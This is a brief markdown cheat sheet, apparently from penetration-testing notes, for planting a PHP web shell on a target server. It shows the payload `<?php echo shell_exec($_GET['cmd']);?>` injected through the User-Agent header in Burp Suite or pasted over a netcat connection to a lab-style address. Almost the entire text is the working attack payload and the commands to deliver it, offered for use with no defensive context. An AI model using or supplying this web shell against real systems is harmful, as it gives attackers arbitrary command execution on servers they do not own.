- - -

## Via BurpSuite : 

- [ ] open the request in Burp 
- [ ] Change User-Agent content to :

```php
<?php echo shell_exec($_GET['cmd']);?>
```

- - -

##  Via Netcat :

Connect to the target with netcat :
```sh
nc -v 10.11.1.111 80
```

And paste the following payload : 
```php
<?php echo shell_exec($_GET['cmd']);?>
```


